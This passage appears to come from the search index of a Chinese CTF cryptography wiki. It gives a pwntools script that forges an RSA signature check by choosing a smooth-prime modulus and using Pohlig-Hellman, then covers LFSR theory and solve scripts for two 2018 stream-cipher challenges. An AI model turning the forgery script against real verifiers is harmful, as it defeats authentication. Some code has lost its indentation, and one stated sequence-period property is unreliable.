\u6709\u7ea6\u675f\uff0c\u5fc5\u987b\u5927\u4e8e 3\uff0c\u6240\u4ee5\u6211\u4eec\u4e0d\u80fd\u4f7f\u7528 1 \u4e86\u3002</p> <p>h(m)^e mod \\ n=pad(m)</p> <p>\u8fd9\u91cc\u6211\u4eec\u5df2\u7ecf\u77e5\u9053 <code>h(m)\uff0cpad(m)</code>\u3002\u6211\u4eec\u53ea\u9700\u8981\u6784\u9020\u5269\u4e0b\u7684\u6570\u5373\u53ef\uff0c\u8fd9\u91cc\u6211\u4eec\u6784\u9020 n \u4e3a\u7d20\u6570\uff0c\u4f7f\u5f97 n-1\u662f\u4e00\u4e2a\u5149\u6ed1\u6570\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u4f7f\u7528 pohlig_hellman \u7b97\u6cd5\u4e86\u3002</p> <pre><code>from Crypto.Hash import SHA\nfrom pwn import *\nimport gmpy2\nfrom gmpy2 import is_prime\nimport random\n\n\ndef PKCS1_pad(data):\n    asn1 = \"3021300906052b0e03021a05000414\"\n    ans = asn1 + data\n    n = len(ans)\n    return int(('00' + '01' + 'ff' * (1024 / 8 - n / 2 - 3) + '00' + ans), 16)\n\n\n#context.log_level = 'debug'\ndef gen_smooth_num(plist, minnum=pow(2, 1020)):\n    lenp = len(plist)\n    while True:\n        n = 1\n        factors = dict()\n        while n + 1 &lt; minnum:\n            tmp = random.randint(0, lenp - 1)\n            n *= plist[tmp]\n            if plist[tmp] in factors:\n                factors[plist[tmp]] += 1\n            else:\n                factors[plist[tmp]] = 1\n        if n.bit_length() &gt; 1024:\n            continue\n        if is_prime(n + 1):\n            return n + 1, factors\n\n\n# http://pythonexample.com/snippet/pohligpy_neuratron_python\n# solve g^x=h mod m\ndef log_prime_power(g, h, pf, pe, M):\n\n    powers = [pf**k for k in range(pe)]\n\n    gamma = gmpy2.powmod(g, powers[-1], M)\n\n    xk = gmpy2.mpz(0)\n    for k in range(pe):\n        if k == 0:\n            hk = gmpy2.powmod(h, powers[pe - k - 1], M)\n        else:\n            gk = gmpy2.powmod(g, xk * (M - 2), M)\n            hk = gmpy2.powmod(gk * h, powers[pe - k - 1], M)\n\n        k_log_found = False\n        for dk in range(pf):\n            yk = gmpy2.powmod(gamma, dk, M)\n            if yk == hk:\n                k_log_found = True\n                break\n\n        if not k_log_found:\n            raise Exception(\"can not solve\")\n\n        xk += gmpy2.mul(powers[k], dk)\n\n    return xk\n\n\ndef pohlig_hellman(g, h, M, factors):\n    M1 = M - 1\n    xs = []\n    for f in factors:\n        pf = f\n        pe = factors[f]\n\n        subgroup_exponent = gmpy2.div(M1, gmpy2.powmod(pf, pe, M))\n        gi = gmpy2.powmod(g, subgroup_exponent, M)\n        hi = gmpy2.powmod(h, subgroup_exponent, M)\n\n        xi = log_prime_power(gi, hi, pf, pe, M)\n        xs.append(xi)\n    crt_coeffs = []\n\n    for f in factors:\n        pf = f\n        pe = factors[f]\n\n        mi = pf**pe\n\n        bi = gmpy2.div(M, mi)\n        bi_inv = gmpy2.invert(bi, mi)\n        crt_coeffs.append(gmpy2.mul(bi, bi_inv))\n    x = 0\n    for i in range(len(crt_coeffs)):\n        x = gmpy2.t_mod(x + gmpy2.t_mod(xs[i] * crt_coeffs[i], M1), M1)\n    return x\n\n\n#context.log_level = 'debug'\n\n\ndef main():\n    port = 12345\n    host = \"127.0.0.1\"\n    p = remote(host, port)\n    p.recvuntil('Message   -&gt; ')\n    message = p.recvuntil('\\n\\nSignature -&gt; ', drop=True)\n    log.info('message: ' + message)\n    signature = p.recvuntil('\\n', drop=True)\n    log.info('signature: ' + signature)\n    signature = int(signature, 16)\n    h = SHA.new(message)\n\n    m = PKCS1_pad(h.hexdigest())\n    print m, signature\n    plist = []\n    for i in range(2, 1000):\n        if is_prime(i):\n            plist.append(i)\n    while True:\n        try:\n            n, factors = gen_smooth_num(plist, signature)\n            e = pohlig_hellman(signature, m, n, factors)\n        except Exception as e:\n            continue\n        else:\n            break\n    print n, e\n\n    print m\n    print gmpy2.powmod(signature, e, n)\n\n    p.sendlineafter('Enter n:', str(n))\n    p.sendlineafter('Enter e:', str(e))\n\n    p.interactive()\n\n\nmain()\n</code></pre> <p>\u6709\u4e24\u70b9\u9700\u8981\u6ce8\u610f</p> <ol> <li>\u7531\u4e8e g^x=y \u4e2d\u7684 g \u548c y \u90fd\u662f\u7ed9\u5b9a\u7684\uff0c\u6211\u4eec\u65b0\u627e\u5230\u7684 n\uff0c\u4e0d\u4e00\u5b9a g \u7684\u5e42\u6b21\u6784\u6210\u7684\u7fa4\u4f1a\u5305\u542b y\uff0c\u6240\u4ee5\u53ef\u80fd\u6c42\u89e3\u5931\u8d25\uff0c\u6240\u4ee5\u9700\u8981\u591a\u6b21\u6c42\u89e3\u3002</li> <li>\u6e90\u4ee3\u7801\u4e2d\u867d\u7136 <code>n.bit_length() &lt;= 1025</code>\uff0c\u4f46\u662f\u5176\u5b9e n \u5728\u6ee1\u8db3\u4e0d\u5c0f\u4e8e signature \u7684\u6761\u4ef6\u65f6\uff0c\u5fc5\u987b\u6ee1\u8db3\u5982\u4e0b\u6761\u4ef6\uff08pycrypto \u6e90\u7801\uff09</li> </ol> <pre><code>        modBits = Crypto.Util.number.size(self._key.n)\n        k = ceil_div(modBits,8) # Convert from bits to bytes\n\n        # Step 1\n        if len(S) != k:\n            return 0\n</code></pre> <p>\u6240\u4ee5\u6211\u4eec\u6700\u597d\u8bbe\u7f6e n \u4e3a1024 \u6bd4\u7279\u4f4d\u3002</p>"},{"location":"crypto/streamcipher/intro/","title":"\u6d41\u5bc6\u7801","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u6d41\u5bc6\u7801\u4e00\u822c\u9010\u5b57\u8282\u6216\u8005\u9010\u6bd4\u7279\u5904\u7406\u4fe1\u606f\u3002\u4e00\u822c\u6765\u8bf4</p> <ul> <li>\u6d41\u5bc6\u7801\u7684\u5bc6\u94a5\u957f\u5ea6\u4f1a\u4e0e\u660e\u6587\u7684\u957f\u5ea6\u76f8\u540c\u3002</li> <li>\u6d41\u5bc6\u7801\u7684\u5bc6\u94a5\u6d3e\u751f\u81ea\u4e00\u4e2a\u8f83\u77ed\u7684\u5bc6\u94a5\uff0c\u6d3e\u751f\u7b97\u6cd5\u901a\u5e38\u4e3a\u4e00\u4e2a\u4f2a\u968f\u673a\u6570\u751f\u6210\u7b97\u6cd5\u3002</li> </ul> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6d41\u52a0\u5bc6\u76ee\u524d\u6765\u8bf4\u90fd\u662f\u5bf9\u79f0\u52a0\u5bc6\u3002</p> <p>\u4f2a\u968f\u673a\u6570\u751f\u6210\u7b97\u6cd5\u751f\u6210\u7684\u5e8f\u5217\u7684\u968f\u673a\u6027\u8d8a\u5f3a\uff0c\u660e\u6587\u4e2d\u7684\u7edf\u8ba1\u7279\u5f81\u88ab\u8986\u76d6\u7684\u66f4\u597d\u3002</p> <p>\u6d41\u5bc6\u7801\u52a0\u89e3\u5bc6\u975e\u5e38\u7b80\u5355\uff0c\u5728\u5df2\u77e5\u660e\u6587\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u975e\u5e38\u5bb9\u6613\u5730\u83b7\u53d6\u5bc6\u94a5\u6d41\u3002</p> <p>\u6d41\u5bc6\u7801\u7684\u5173\u952e\u5728\u4e8e\u8bbe\u8ba1\u597d\u7684\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u7684\u57fa\u672c\u6784\u9020\u6a21\u5757\u4e3a\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\u3002\u5f53\u7136\uff0c\u4e5f\u6709\u4e00\u4e9b\u7279\u6b8a\u8bbe\u8ba1\u7684\u6d41\u5bc6\u7801\uff0c\u6bd4\u5982 RC4\u3002</p>"},{"location":"crypto/streamcipher/fsr/intro/","title":"\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u4e00\u822c\u7684\uff0c\u4e00\u4e2a n \u7ea7\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\u5982\u4e0b\u56fe\u6240\u793a</p> <p></p> <p>\u5176\u4e2d</p> <ul> <li>a_0\uff0ca_1\uff0c\u2026\uff0ca_{n-1}\uff0c\u4e3a\u521d\u6001\u3002</li> <li>F \u4e3a\u53cd\u9988\u51fd\u6570\u6216\u8005\u53cd\u9988\u903b\u8f91\u3002\u5982\u679c F \u4e3a\u7ebf\u6027\u51fd\u6570\uff0c\u90a3\u4e48\u6211\u4eec\u79f0\u5176\u4e3a\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\uff08LFSR\uff09\uff0c\u5426\u5219\u6211\u4eec\u79f0\u5176\u4e3a\u975e\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\uff08NFSR\uff09\u3002</li> <li>a_{i+n}=F(a_i,a_{i+1},...,a_{i+n-1}) \u3002</li> </ul> <p>\u4e00\u822c\u6765\u8bf4\uff0c\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\u90fd\u4f1a\u5b9a\u4e49\u5728\u67d0\u4e2a\u6709\u9650\u57df\u4e0a\uff0c\u4ece\u800c\u907f\u514d\u6570\u5b57\u592a\u5927\u548c\u592a\u5c0f\u7684\u95ee\u9898\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u89c6\u4e3a\u540c\u4e00\u4e2a\u7a7a\u95f4\u4e2d\u7684\u53d8\u6362\uff0c\u5373</p> <p>(a_i,a_{i+1},...,a_{i+n-1}) \\rightarrow (a_{i+1},...,a_{i+n-1},a_{i+n}) . \u5bf9\u4e8e\u4e00\u4e2a\u5e8f\u5217\u6765\u8bf4\uff0c\u6211\u4eec\u4e00\u822c\u5b9a\u4e49\u5176\u751f\u6210\u51fd\u6570\u4e3a\u5176\u5e8f\u5217\u5bf9\u5e94\u7684\u5e42\u7ea7\u6570\u7684\u548c\u3002</p>"},{"location":"crypto/streamcipher/fsr/lfsr/","title":"\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668 - LFSR","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"crypto/streamcipher/fsr/lfsr/#_1","title":"\u4ecb\u7ecd","text":"<p>\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\u7684\u53cd\u9988\u51fd\u6570\u4e00\u822c\u5982\u4e0b</p> <p>a_{i+n}=\\sum\\limits_{j=1}^{n}c_ja_{i+n-j}</p> <p>\u5176\u4e2d\uff0cc_j \u5747\u5728\u67d0\u4e2a\u6709\u9650\u57df F_q \u4e2d\u3002</p> <p>\u65e2\u7136\u7ebf\u6027\u7a7a\u95f4\u662f\u4e00\u4e2a\u7ebf\u6027\u53d8\u6362\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u77e5\u8fd9\u4e2a\u7ebf\u6027\u53d8\u6362\u4e3a</p>  \\begin{align*} &amp;\\left[   a_{i+1},a_{i+2},a_{i+3}, ...,a_{i+n} \\right]\\\\\\\\=&amp;\\left[   a_{i},a_{i+1},a_{i+2}, ...,a_{i+n-1} \\right]\\left[ \\begin{matrix} 0   &amp; 0      &amp; \\cdots &amp; 0 &amp; c_n     \\\\ 1   &amp; 0      &amp; \\cdots &amp; 0 &amp; c_{n-1}  \\\\ 0   &amp; 1      &amp; \\cdots &amp; 0 &amp; c_{n-2}\\\\\\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\ 0   &amp; 0      &amp; \\cdots &amp; 1 &amp; c_1     \\\\ \\end{matrix} \\right]\\\\\\\\=&amp;\\left[   a_{0},a_{1},a_{2}, ...,a_{n-1} \\right]\\left[ \\begin{matrix} 0   &amp; 0      &amp; \\cdots &amp; 0 &amp; c_n     \\\\ 1   &amp; 0      &amp; \\cdots &amp; 0 &amp; c_{n-1}  \\\\ 0   &amp; 1      &amp; \\cdots &amp; 0 &amp; c_{n-2}\\\\\\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\ 0   &amp; 0      &amp; \\cdots &amp; 1 &amp; c_1     \\\\ \\end{matrix} \\right]^{i+1} \\end{align*}  <p>\u8fdb\u800c\uff0c\u6211\u4eec\u53ef\u4ee5\u6c42\u5f97\u5176\u7279\u5f81\u591a\u9879\u5f0f\u4e3a</p> <p>f(x)=x^n-\\sum\\limits_{i=1}^{n}c_ix^{n-i}</p> <p>\u540c\u65f6\uff0c\u6211\u4eec\u5b9a\u4e49\u5176\u4e92\u53cd\u591a\u9879\u5f0f\u4e3a</p> <p>\\overline f(x)=x^nf(\\frac{1}{x})=1-\\sum\\limits_{i=1}^{n}c_ix^{i}</p> <p>\u6211\u4eec\u4e5f\u79f0\u4e92\u53cd\u591a\u9879\u5f0f\u4e3a\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\u7684\u8054\u7ed3\u591a\u9879\u5f0f\u3002</p> <p>\u8fd9\u91cc\u6709\u4e00\u4e9b\u5b9a\u7406\u9700\u8981\u6211\u4eec\u8bb0\u4e00\u4e0b\uff0c\u611f\u5174\u8da3\u7684\u53ef\u4ee5\u81ea\u884c\u63a8\u5bfc\u3002</p>"},{"location":"crypto/streamcipher/fsr/lfsr/#_2","title":"\u7279\u5f81\u591a\u9879\u5f0f\u4e0e\u751f\u6210\u51fd\u6570","text":"<p>\u5df2\u77e5\u67d0\u4e2a n \u7ea7\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\u7684\u7279\u5f81\u591a\u9879\u5f0f\uff0c\u90a3\u4e48\u8be5\u5e8f\u5217\u5bf9\u5e94\u7684\u751f\u6210\u51fd\u6570\u4e3a</p> <p>A(x)=\\frac{p(x)}{\\overline f(x)}</p> <p>\u5176\u4e2d\uff0cp(x)=\\sum\\limits_{i=1}^{n}(c_{n-i}x^{n-i}\\sum\\limits_{j=1}^{i}a_jx^{j-1})\u3002\u53ef\u4ee5\u770b\u51fa p(x) \u5b8c\u5168\u7531\u521d\u59cb\u72b6\u6001\u548c\u53cd\u9988\u51fd\u6570\u7684\u7cfb\u6570\u51b3\u5b9a\u3002</p>"},{"location":"crypto/streamcipher/fsr/lfsr/#_3","title":"\u5e8f\u5217\u5468\u671f\u4e0e\u751f\u6210\u51fd\u6570","text":"<p>\u5e8f\u5217\u7684\u7684\u5468\u671f\u4e3a\u5176\u751f\u6210\u51fd\u6570\u7684\u65e2\u7ea6\u771f\u5206\u5f0f\u7684\u5206\u6bcd\u7684\u5468\u671f\u3002</p> <p>\u5bf9\u4e8e n \u7ea7\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\uff0c\u6700\u957f\u5468\u671f\u4e3a 2^{n}-1\uff08\u6392\u9664\u5168\u96f6\uff09\u3002\u8fbe\u5230\u6700\u957f\u5468\u671f\u7684\u5e8f\u5217\u4e00\u822c\u79f0\u4e3a m \u5e8f\u5217\u3002</p>"},{"location":"crypto/streamcipher/fsr/lfsr/#_4","title":"\u7279\u6b8a\u6027\u8d28","text":"<ul> <li>\u5c06\u4e24\u4e2a\u5e8f\u5217\u7d2f\u52a0\u5f97\u5230\u65b0\u7684\u5e8f\u5217\u7684\u5468\u671f\u4e3a\u8fd9\u4e24\u4e2a\u5e8f\u5217\u7684\u5468\u671f\u7684\u548c\u3002</li> <li>\u5e8f\u5217\u662f n \u7ea7 m \u5e8f\u5217\uff0c\u5f53\u4e14\u4ec5\u5f53\u5e8f\u5217\u7684\u6781\u5c0f\u591a\u9879\u5f0f\u662f n \u6b21\u672c\u539f\u591a\u9879\u5f0f\u3002</li> </ul>"},{"location":"crypto/streamcipher/fsr/lfsr/#b-m","title":"B-M \u7b97\u6cd5","text":"<p>\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u4ece\u4e24\u79cd\u89d2\u5ea6\u6765\u8003\u8651 LFSR</p> <ul> <li>\u5bc6\u94a5\u751f\u6210\u89d2\u5ea6\uff0c\u4e00\u822c\u6211\u4eec\u5e0c\u671b\u4f7f\u7528\u7ea7\u6570\u5c3d\u53ef\u80fd\u4f4e\u7684 LFSR \u6765\u751f\u6210\u5468\u671f\u5927\uff0c\u968f\u673a\u6027\u597d\u7684\u5e8f\u5217\u3002</li> <li>\u5bc6\u7801\u5206\u6790\u89d2\u5ea6\uff0c\u7ed9\u5b9a\u4e00\u4e2a\u957f\u5ea6\u4e3a n \u7684\u5e8f\u5217 a\uff0c\u5982\u4f55\u6784\u9020\u4e00\u4e2a\u7ea7\u6570\u5c3d\u53ef\u80fd\u5c0f\u7684 LFSR \u6765\u751f\u6210\u5b83\u3002\u5176\u5b9e\u8fd9\u5c31\u662f B-M \u7b97\u6cd5\u7684\u6765\u6e90\u3002</li> </ul> <p>\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u5b9a\u4e49\u4e00\u4e2a\u5e8f\u5217\u7684\u7ebf\u6027\u590d\u6742\u5ea6\u5982\u4e0b</p> <ul> <li>\u82e5 s \u4e3a\u4e00\u4e2a\u5168\u96f6\u5e8f\u5217\uff0c\u5219\u7ebf\u6027\u590d\u6742\u5ea6\u4e3a0\u3002</li> <li>\u82e5\u6ca1\u6709 LFSR \u80fd\u751f\u6210 s\uff0c\u5219\u7ebf\u6027\u590d\u6742\u5ea6\u4e3a\u65e0\u7a77\u3002</li> <li>\u5426\u5219\uff0cs \u7684\u7ebf\u6027\u590d\u6742\u5ea6\u4e3a\u751f\u6210 L(s) \u7684\u6700\u5c0f\u7ea7\u7684 LFSR\u3002</li> </ul> <p>BM \u7b97\u6cd5\u7684\u8981\u6c42\u6211\u4eec\u9700\u8981\u77e5\u9053\u957f\u5ea6\u4e3a 2n \u7684\u5e8f\u5217\u3002\u5176\u590d\u6742\u5ea6</p> <ul> <li>\u65f6\u95f4\u590d\u6742\u5ea6\uff1aO(n^2) \u6b21\u6bd4\u7279\u64cd\u4f5c</li> <li>\u7a7a\u95f4\u590d\u6742\u5ea6\uff1aO(n) \u6bd4\u7279\u3002</li> </ul> <p>\u5173\u4e8e BM \u7b97\u6cd5\u7684\u7ec6\u8282\uff0c\u540e\u7eed\u6dfb\u52a0\uff0c\u76ee\u524d\u5904\u4e8e\u5b66\u4e60\u8fc7\u7a0b\u4e2d\u3002</p> <p>\u4f46\u662f\u5176\u5b9e\u5982\u679c\u6211\u4eec\u77e5\u9053\u4e86\u957f\u5ea6\u4e3a 2n \u7684\u5e8f\u5217\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u4e00\u79cd\u6bd4\u8f83\u7b28\u7684\u65b9\u6cd5\u6765\u83b7\u53d6\u539f\u5148\u7684\u5e8f\u5217\u3002\u4e0d\u59a8\u5047\u8bbe\u5df2\u77e5\u7684\u5e8f\u5217\u4e3aa_1,...,a_{2n}\uff0c\u6211\u4eec\u53ef\u4ee5\u4ee4</p> <p>S_1=(a_1,...,a_n)</p> <p>S_2=(a_2,...,a_{n+1})</p> <p>....</p> <p>S_{n+1}=(a_{n+1},...,a_{2n})</p> <p>\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u77e9\u9635 X=(S_1,...,S_n)\uff0c\u90a3\u4e48</p> <p>S_{n+1}=(c_n,...,c_1)X</p> <p>\u6240\u4ee5</p> <p>(c_n,...,c_1)=S_{n+1}X^{-1}</p> <p>\u8fdb\u800c\u6211\u4eec\u4e5f\u5c31\u77e5\u9053\u4e86 LFSR \u7684\u53cd\u9988\u8868\u8fbe\u5f0f\uff0c\u8fdb\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u63a8\u51fa\u521d\u59cb\u5316\u79cd\u5b50\u3002</p>"},{"location":"crypto/streamcipher/fsr/lfsr/#2018-streamgame1","title":"2018 \u5f3a\u7f51\u676f streamgame1","text":"<p>\u7b80\u5355\u770b\u4e00\u4e0b\u9898\u76ee</p> <pre><code>from flag import flag\nassert flag.startswith(\"flag{\")\nassert flag.endswith(\"}\")\nassert len(flag)==25\n\ndef lfsr(R,mask):\n    output = (R &lt;&lt; 1) &amp; 0xffffff\n    i=(R&amp;mask)&amp;0xffffff\n    lastbit=0\n    while i!=0:\n        lastbit^=(i&amp;1)\n        i=i&gt;&gt;1\n    output^=lastbit\n    return (output,lastbit)\n\n\n\nR=int(flag[5:-1],2)\nmask    =   0b1010011000100011100\n\nf=open(\"key\",\"ab\")\nfor i in range(12):\n    tmp=0\n    for j in range(8):\n        (R,out)=lfsr(R,mask)\n        tmp=(tmp &lt;&lt; 1)^out\n    f.write(chr(tmp))\nf.close()\n</code></pre> <p>\u53ef\u4ee5\u53d1\u73b0\uff0cflag \u7684\u957f\u5ea6\u4e3a25-5-1=19\uff0c\u6240\u4ee5\u53ef\u4ee5\u66b4\u529b\u679a\u4e3e\u3002\u7ed3\u679c</p> <pre><code>\u279c  2018-\u5f3a\u7f51\u676f-streamgame1 git:(master) \u2717 python exp.py\n12\n0b1110101100001101011\n</code></pre> <p>\u56e0\u6b64 flag \u4e3a flag{1110101100001101011}\u3002</p>"},{"location":"crypto/streamcipher/fsr/lfsr/#2018-ciscn-oldstreamgame","title":"2018 CISCN \u521d\u8d5b oldstreamgame","text":"<p>\u7b80\u5355\u770b\u4e00\u4e0b\u9898\u76ee</p> <pre><code>flag = \"flag{xxxxxxxxxxxxxxxx}\"\nassert flag.startswith(\"flag{\")\nassert flag.endswith(\"}\")\nassert len(flag)==14\n\ndef lfsr(R,mask):\n    output = (R &lt;&lt; 1) &amp; 0xffffffff\n    i=(R&amp;mask)&amp;0xffffffff\n    lastbit=0\n    while i!=0:\n        lastbit^=(i&amp;1)\ni=i&gt;&gt;1\n    output^=lastbit\n    return (output,lastbit)\n\nR=int(flag[5:-1],16)\nmask = 0b10100100000010000000100010010100\n\nf=open(\"key\",\"w\")\nfor i in range(100):\n    tmp=0\nfor j in range(8):\n        (R,out)=lfsr(R,mask)\ntmp=(tmp &lt;&lt; 1)^out\n    f.write(chr(tmp))\nf.close()\n</code></pre> <p>\u7a0b\u5e8f\u5f88\u7b80\u5355\uff0c\u4ecd\u7136\u662f\u4e00\u4e2a LFSR\uff0c\u4f46\u662f\u521d\u6001\u662f 32 \u6bd4\u7279\u4f4d\uff0c\u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u9009\u62e9\u7206\u7834\uff0c\u4f46\u662f\u8fd9\u91cc\u4e0d\u9009\u62e9\u7206\u7834\u3002</p> <p>\u8fd9\u91cc\u7ed9\u51fa\u4e24\u79cd\u505a\u6cd5\u3002</p> <p>\u7b2c\u4e00\u79cd\u505a\u6cd5\uff0c\u7a0b\u5e8f\u8f93\u51fa\u7684\u7b2c 32 \u4e2a\u6bd4\u7279\u662f\u7531\u7a0b\u5e8f\u8f93\u51fa\u7684\u524d 31 \u4e2a\u6bd4\u7279\u548c\u521d\u59cb\u79cd\u5b50\u7684\u7b2c 1 \u4e2a\u6bd4\u7279\u6765\u51b3\u5b9a\u7684\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u521d\u59cb\u79cd\u5b50\u7684\u7b2c\u4e00\u4e2a\u6bd4\u7279\uff0c\u8fdb\u800c\u53ef\u4ee5\u77e5\u9053\u521d\u59cb\u79cd\u5b50\u7684\u7b2c 2 \u4e2a\u6bd4\u7279\uff0c\u4f9d\u6b21\u7c7b\u63a8\u3002\u4ee3\u7801\u5982\u4e0b</p> <pre><code>mask = 0b10100100000010000000100010010100\nb = ''\nN = 32\nwith open('key', 'rb') as f:\n    b = f.read()\nkey = ''\nfor i in range(N / 8):\n    t = ord(b[i])\n    for j in xrange(7, -1, -1):\n        key += str(t &gt;&gt; j &amp; 1)\nidx = 0\nans = \"\"\nkey = key[31] + key[:32]\nwhile idx &lt; 32:\n    tmp = 0\n    for i in range(32):\n        if mask &gt;&gt; i &amp; 1:\n            tmp ^= int(key[31 - i])\n    ans = str(tmp) + ans\n    idx += 1\n    key = key[31] + str(tmp) + key[1:31]\nnum = int(ans, 2)\nprint hex(num)\n</code></pre> <p>\u8fd0\u884c</p> <pre><code>\u279c  2018-CISCN-start-oldstreamgame git:(master) \u2717 python exp1.py\n0x926201d7\n</code></pre> <p>\u7b2c\u4e8c\u79cd\u505a\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u4e00\u4e0b\u77e9\u9635\u8f6c\u6362\u7684\u8fc7\u7a0b\uff0c\u5982\u679c\u8fdb\u884c\u4e86 32 \u6b21\u7ebf\u6027\u53d8\u6362\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5f97\u5230\u8f93\u51fa\u6d41\u524d 32 \u4e2a\u6bd4\u7279\u3002\u800c\u5176\u5b9e\uff0c\u6211\u4eec\u53ea\u9700\u8981\u524d 32 \u4e2a\u6bd4\u7279\u5c31\u53ef\u4ee5\u6062\u590d\u521d\u59cb\u72b6\u6001\u4e86\u3002</p> <pre><code>mask = 0b10100100000010000000100010010100\n\nN = 32\nF = GF(2)\n\nb = ''\nwith open('key', 'rb') as f:\n    b = f.read()\n\nR = [vector(F, N) for i in range(N)]\nfor i in range(N):\n    R[i][N - 1] = mask &gt;&gt; (31 - i) &amp; 1\nfor i in range(N - 1):\n    R[i + 1][i] = 1\nM = Matrix(F, R)\nM = M ^ N\n\nvec = vector(F, N)\nrow = 0\nfor i in range(N / 8):\n    t = ord(b[i])\n    for j in xrange(7, -1, -1):\n        vec[row] = t &gt;&gt; j &amp; 1\n        row += 1\nprint rank(M)\nnum = int(''.join(map(str, list(M.solve_left(vec)))), 2)\nprint hex(num)\n</code></pre> <p>\u8fd0\u884c\u811a\u672c</p> <pre><code>\u279c  2018-CISCN-start-oldstreamgame git:(master) \u2717 sage exp.sage\n32\n0x926201d7\n</code></pre> <p>\u4ece\u800c flag \u4e3a flag{926201d7}\u3002</p> <p>\u8fd8\u6709\u4e00\u79cd\u505a\u6cd5\u662f TokyoWesterns \u7684\uff0c\u53ef\u4ee5\u53c2\u8003\u5bf9\u5e94\u7684\u6587\u4ef6\u5939\u7684\u6587\u4ef6\u3002</p>"},{"location":"crypto/streamcipher/fsr/lfsr/#_5","title":"\u9898\u76ee","text":""},{"location":"crypto/streamcipher/fsr/lfsr/#_6","title":"\u53c2\u8003\u6587\u732e","text":"<ul> <li>\u5bc6\u7801\u5b66\u8bb2\u4e49\uff0c\u674e\u8d85\uff0c\u5c48\u9f99\u6c5f\u7f16\u8457</li> </ul>"},{"location":"crypto/streamcipher/fsr/nfsr/","title":"\u975e\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"crypto/streamcipher/fsr/nfsr/#_2","title":"\u4ecb\u7ecd","text":"<p>\u4e3a\u4e86\u4f7f\u5f97\u5bc6\u94a5\u6d41\u8f93\u51fa\u7684\u5e8f\u5217\u5c3d\u53ef\u80fd\u590d\u6742\uff0c\u4f1a\u4f7f\u7528\u975e\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\uff0c\u5e38\u89c1\u7684\u6709\u4e09\u79cd</p> <ul> <li>\u975e\u7ebf\u6027\u7ec4\u5408\u751f\u6210\u5668\uff0c\u5bf9\u591a\u4e2a LFSR \u7684\u8f93\u51fa\u4f7f\u7528\u4e00\u4e2a\u975e\u7ebf\u6027\u7ec4\u5408\u51fd\u6570</li> <li>\u975e\u7ebf\u6027\u6ee4\u6ce2\u751f\u6210\u5668\uff0c\u5bf9\u4e00\u4e2a LFSR \u7684\u5185\u5bb9\u4f7f\u7528\u4e00\u4e2a\u975e\u7ebf\u6027\u7ec4\u5408\u51fd\u6570</li> <li>\u949f\u63a7\u751f\u6210\u5668\uff0c\u4f7f\u7528\u4e00\u4e2a\uff08\u6216\u591a\u4e2a\uff09LFSR \u7684\u8f93\u51fa\u6765\u63a7\u5236\u53e6\u4e00\u4e2a\uff08\u6216\u591a\u4e2a\uff09LFSR \u7684\u65f6\u949f </li> </ul>"},{"location":"crypto/streamcipher/fsr/nfsr/#_3","title":"\u975e\u7ebf\u6027\u7ec4\u5408\u751f\u6210\u5668","text":""},{"location":"crypto/streamcipher/fsr/nfsr/#_4","title":"\u7b80\u4ecb","text":"<p>\u7ec4\u5408\u751f\u6210\u5668\u4e00\u822c\u5982\u4e0b\u56fe\u6240\u793a\u3002</p> <p></p>"},{"location":"crypto/streamcipher/fsr/nfsr/#geffe","title":"Geffe","text":"<p>\u8fd9\u91cc\u6211\u4eec\u4ee5 Geffe \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002Geffe \u5305\u542b 3 \u4e2a\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\uff0c\u975e\u7ebf\u6027\u7ec4\u5408\u51fd\u6570\u4e3a</p> <p>F(x_1,x_2,x_3)=(x_1 \\and x_2) \\oplus (\\urcorner x_1 \\and x_3)=(x_1 \\and x_2) \\oplus ( x_1 \\and x_3)\\oplus 